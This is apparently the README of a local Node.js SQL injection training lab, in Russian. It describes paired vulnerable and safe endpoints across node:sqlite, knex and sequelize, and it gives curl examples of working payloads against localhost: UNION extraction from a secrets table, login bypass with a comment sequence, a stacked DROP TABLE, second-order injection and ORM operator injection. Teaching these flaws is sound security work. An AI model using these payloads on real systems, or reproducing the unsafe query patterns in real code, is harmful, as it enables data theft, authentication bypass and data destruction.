## Node.js SQLi minilab

Один файл — `server.js`. Поднимает HTTP-сервер с парами эндпоинтов:

| префикс | смысл |
|---|---|
| `/unsafe-*` | уязвимый вариант, инъекция эксплуатируется |
| `/safe-*` | тот же сценарий без инъекции |

### Запуск

```
cd SQLi/nodejs

# ядро — БЕЗ зависимостей (встроенный node:sqlite, Node >= 22.5)
node server.js

# опционально: включить секции knex + sequelize
npm install
node server.js
```

Открыть список всех сценариев с примерами:

```
curl http://localhost:3000/
```

`GET /reset` — пересоздать и перезаполнить все БД (после `DROP TABLE`, `DELETE` и т.п.).

### Данные

- `users(id, name, role, email, password)` — alice/user, bob/admin, carol/user
- `secrets(id, name, value)` — `FLAG{n0de_sql1_lab}`, `db_root_token`
- `profiles(id, nickname)` — для second-order

Цель большинства инъекций — вытащить строки из `secrets` через `UNION`.

### Что покрыто

**raw driver (`node:sqlite`)**

| сценарий | неочевидное |
|---|---|
| `concat`, `template` | конкатенация и template literal — одно и то же |
| `numeric` | числовой контекст без кавычек: инъекция без единой `'` |
| `like` | инъекция + wildcard-инъекция (`%`, `_`) |
| `in` | `IN (...)` склеен из массива |
| `order`, `limit` | плейсхолдером не закрыть → склейка; blind / UNION |
| `prepare-late` | «мы же используем prepared statements» — строка испорчена ДО `prepare()` |
| `exec-stacked` | `.prepare()` выполнит только 1-й стейтмент, `.exec()` — все (`DROP TABLE`) |
| `second-order` | запись параметризована, инъекция срабатывает при ЧТЕНИИ своих же данных |
| `identifier` | значение через `?`, но имя столбца склеено → oracle/выкачка (`col=password`) |
| `login` | `-- ` отрезает проверку пароля |
| `type-juggling` | JSON-тело даёт массив/объект вместо строки → `${value}` ломает `WHERE` |

**query builder (`knex`)**

`whereRaw` / `orderByRaw` / `knex.raw(\`...\`)` со склейкой против `.where({})`,
`.orderBy(col, dir)` с allow-list, `knex.raw(sql, [bindings])`.

**ORM (`sequelize`)**

`sequelize.query(\`...\`)` против `{ replacements }` / `{ bind }`;
`Sequelize.literal()` отключает экранирование; **operator injection** —
ключи из пользовательского JSON маппятся в `Op[...]`, атакующий управляет
структурой условия (обход фильтра) против фиксированного `where`.

### Примеры

```
# UNION из secrets
curl -G --data-urlencode "name=' UNION SELECT id, name, value FROM secrets -- " \
  http://localhost:3000/unsafe-concat

# инъекция без кавычек
curl -G --data-urlencode "id=0 UNION SELECT id, name, value FROM secrets" \
  http://localhost:3000/unsafe-numeric

# обход аутентификации
curl -G --data-urlencode "user=bob'-- " --data-urlencode "pass=x" \
  http://localhost:3000/unsafe-login

# stacked query (потом GET /reset)
curl -X POST -H 'content-type: application/json' \
  --data-raw '{"name":"x'"'"'; DROP TABLE secrets; -- "}' \
  http://localhost:3000/unsafe-exec-stacked

# second-order
curl -G --data-urlencode "nickname=' UNION SELECT id, name, value FROM secrets -- " \
  http://localhost:3000/unsafe-second-order-store
curl http://localhost:3000/unsafe-second-order-use

# sequelize operator injection
curl -X POST -H 'content-type: application/json' -d '{"role":{"ne":"__none__"}}' \
  http://localhost:3000/unsafe-sequelize-operator
```

Каждый запрос печатает в консоль итоговый SQL — видно, во что превратился ввод.
